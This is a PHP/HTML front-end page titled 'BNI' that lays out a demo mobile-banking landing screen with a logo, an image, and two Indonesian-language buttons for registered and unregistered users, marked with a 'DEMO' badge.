<?php
?>
<html>
    <head>
        <title>BNI</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="assets/common/css/global.css">
        <link rel="stylesheet" href="assets/common/css/home.css">
        <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
        <script src="assets/common/js/jquery.js"></script>
        <script>
            const module = {};
        </script>
        <script type="module" src="assets/common/js/home.js"></script>
    </head>
    <body>
        <div style="width: 100%; height: 100%; display: flex; flex-direction: column;">
            <div style="padding: 10px; background-color: #e55300;">
                <img src="assets/common/img/img1.png" width="100px" height="50px">
            </div>
            <div style="padding-left: 30px; padding-right: 30px; background-color: #ffffff; display: flex; flex-direction: column; align-items: center;">
                <img src="assets/common/img/img2.png" width="300px" height="300px" style="margin-top: 20px; object-fit: fill;">
                <div class="ripple" style="width: 100%; height: 50px; background-color: #e55300; display: flex; flex-direction: row; justify-content: center; align-items: center; color: #ffffff; font-size: 15px; font-weight: bold; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.4);" onclick="module.signIn()">
                    Sudah Terdaftar Mobile Banking
                </div>
                <div class="ripple" style="width: 100%; height: 50px; background-color: #ffffff; border: 2px solid #e55300; display: flex; flex-direction: row; justify-content: center; align-items: center; color: #e55300; font-size: 15px; font-weight: bold; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.4); margin-top: 10px;" onclick="module.signUp()">
                    Belum Terdaftar Mobile Banking
                </div>
            </div>
            <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; color: #ffffff; font-size: 20px; font-weight: bold; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px;">DEMO</div>
        </div>
    </body>
</html>